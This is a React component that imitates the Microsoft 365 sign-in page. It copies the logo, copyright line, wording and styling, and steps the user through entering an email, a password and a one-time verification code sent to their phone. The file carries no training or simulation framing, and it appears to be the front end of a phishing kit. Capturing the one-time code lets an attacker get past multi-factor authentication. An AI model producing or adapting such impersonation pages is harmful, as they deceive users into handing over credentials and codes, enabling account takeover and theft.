import React from 'react';
import { ShieldCheck } from 'lucide-react';

const MicrosoftLogo = ({ size = 21 }) => (
  <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 21 21">
    <rect x="1" y="1" width="9" height="9" fill="#f25022" />
    <rect x="11" y="1" width="9" height="9" fill="#7fba00" />
    <rect x="1" y="11" width="9" height="9" fill="#00a4ef" />
    <rect x="11" y="11" width="9" height="9" fill="#ffb900" />
  </svg>
);

const Spinner = () => (
  <svg className="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" />
  </svg>
);

export default function Office365LoginPage({
  email, password, otp, formStep,
  isSubmitting, emailError, pwWarning, otpError,
  onInputChange, onContinue, onPasswordSubmit, onOtpSubmit, onOtpChange,
  onBack, onClose, hint,
}) {
  return (
    <div className="min-h-screen w-screen flex">
      {/* Left panel */}
      <div className="hidden md:flex flex-col justify-between bg-[#243a5e] w-[420px] shrink-0 p-10">
        <div className="flex items-center gap-3">
          <MicrosoftLogo size={24} />
          <span className="text-white text-lg font-semibold tracking-tight">Microsoft 365</span>
        </div>
        <div>
          <p className="text-white/80 text-[13px] leading-relaxed">
            Access all your Microsoft 365 apps and services — Outlook, Teams, OneDrive, and more — from one place.
          </p>
          <div className="mt-8 flex gap-2 flex-wrap">
            {['Word', 'Excel', 'PowerPoint', 'Teams', 'OneDrive'].map(app => (
              <span
                key={app}
                className="text-[11px] bg-white/10 text-white/70 rounded px-2 py-1"
              >
                {app}
              </span>
            ))}
          </div>
        </div>
        <p className="text-white/30 text-[11px]">© Microsoft {new Date().getFullYear()}</p>
      </div>

      {/* Right panel — form */}
      <div className="flex-1 flex items-center justify-center bg-white px-6 py-12">
        <div className="w-full max-w-[380px]">

          {/* Step 1 — Email */}
          {formStep === 1 && (
            <form onSubmit={onContinue}>
              <div className="mb-6">
                <MicrosoftLogo size={28} />
              </div>
              <h1 className="text-[26px] font-semibold text-gray-900 mb-1">Sign in</h1>
              <p className="text-sm text-gray-500 mb-7">Use your Microsoft work or school account</p>

              <div className="mb-5">
                <input
                  type="text"
                  name="email"
                  id="o365-email"
                  value={email}
                  onChange={onInputChange}
                  placeholder="someone@example.com"
                  autoFocus
                  required
                  className={[
                    'w-full border border-gray-300 rounded-none px-3 py-2.5 text-sm outline-none transition',
                    'focus:border-[#0078d4] focus:ring-1 focus:ring-[#0078d4]',
                    emailError ? '!border-red-500 !ring-red-200' : '',
                  ].join(' ')}
                />
                {emailError && <p className="text-xs text-red-600 mt-1">{emailError}</p>}
                {!emailError && <p className="text-xs text-gray-400 mt-1">{hint}</p>}
              </div>

              <p className="text-xs text-gray-500 mb-6">
                Don&apos;t have an account?{' '}
                <span className="text-[#0078d4] hover:underline cursor-pointer">Create one!</span>
              </p>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-[#0078d4] hover:bg-[#006cc1] disabled:opacity-60 text-white text-sm font-medium py-2.5 transition inline-flex items-center justify-center gap-2"
              >
                {isSubmitting ? <><Spinner />Checking…</> : 'Next'}
              </button>
            </form>
          )}

          {/* Step 2 — Password */}
          {formStep === 2 && (
            <form onSubmit={onPasswordSubmit}>
              <div className="mb-6">
                <MicrosoftLogo size={28} />
              </div>
              <h1 className="text-[26px] font-semibold text-gray-900 mb-3">Enter password</h1>

              <div className="inline-flex items-center gap-2 border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600 mb-5">
                <span className="w-5 h-5 rounded-full bg-[#0078d4] text-white flex items-center justify-center font-bold text-[10px]">
                  {email.charAt(0).toUpperCase()}
                </span>
                {email}
              </div>

              <div className="mb-5">
                <input
                  type="password"
                  name="password"
                  id="o365-password"
                  value={password}
                  onChange={onInputChange}
                  placeholder="Password"
                  autoFocus
                  required
                  className={[
                    'w-full border border-gray-300 rounded-none px-3 py-2.5 text-sm outline-none transition',
                    'focus:border-[#0078d4] focus:ring-1 focus:ring-[#0078d4]',
                    pwWarning ? '!border-red-500 !ring-red-200' : '',
                  ].join(' ')}
                />
                {pwWarning && <p className="text-xs text-red-600 mt-1">Your account or password is incorrect.</p>}
              </div>

              <p className="text-xs text-[#0078d4] mb-6 cursor-pointer hover:underline">Forgot my password</p>

              <div className="flex items-center justify-between">
                <button type="button" onClick={onBack} className="text-sm text-[#0078d4] hover:underline">← Back</button>
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="bg-[#0078d4] hover:bg-[#006cc1] disabled:opacity-60 text-white text-sm font-medium px-6 py-2.5 transition inline-flex items-center gap-2"
                >
                  {isSubmitting ? <><Spinner />Signing in…</> : 'Sign in'}
                </button>
              </div>
            </form>
          )}

          {/* Step 3 — OTP */}
          {formStep === 3 && (
            <form onSubmit={onOtpSubmit}>
              <div className="mb-6">
                <MicrosoftLogo size={28} />
              </div>
              <h1 className="text-[26px] font-semibold text-gray-900 mb-1">Verify your identity</h1>
              <p className="text-sm text-gray-500 mb-6">
                A code has been sent to your registered phone. Enter it below to complete sign-in.
              </p>
              <div className="flex justify-center mb-6">
                <div className="w-14 h-14 rounded-full bg-blue-50 border-2 border-blue-200 flex items-center justify-center">
                  <ShieldCheck size={26} className="text-[#0078d4]" />
                </div>
              </div>
              <div className="mb-5">
                <input
                  type="text"
                  id="o365-otp"
                  value={otp}
                  onChange={onOtpChange}
                  placeholder="Enter code"
                  inputMode="numeric"
                  autoFocus
                  required
                  className={[
                    'w-full border border-gray-300 rounded-none px-3 py-2.5 text-sm outline-none tracking-widest transition',
                    'focus:border-[#0078d4] focus:ring-1 focus:ring-[#0078d4]',
                    otpError ? '!border-red-500 !ring-red-200' : '',
                  ].join(' ')}
                />
                {otpError && <p className="text-xs text-red-600 mt-1">{otpError}</p>}
              </div>
              <div className="flex items-center justify-between">
                <button type="button" onClick={onClose} className="text-sm text-[#0078d4] hover:underline">Cancel</button>
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="bg-[#0078d4] hover:bg-[#006cc1] disabled:opacity-60 text-white text-sm font-medium px-6 py-2.5 transition inline-flex items-center gap-2"
                >
                  {isSubmitting ? <><Spinner />Verifying…</> : 'Verify'}
                </button>
              </div>
            </form>
          )}

        </div>
      </div>
    </div>
  );
}
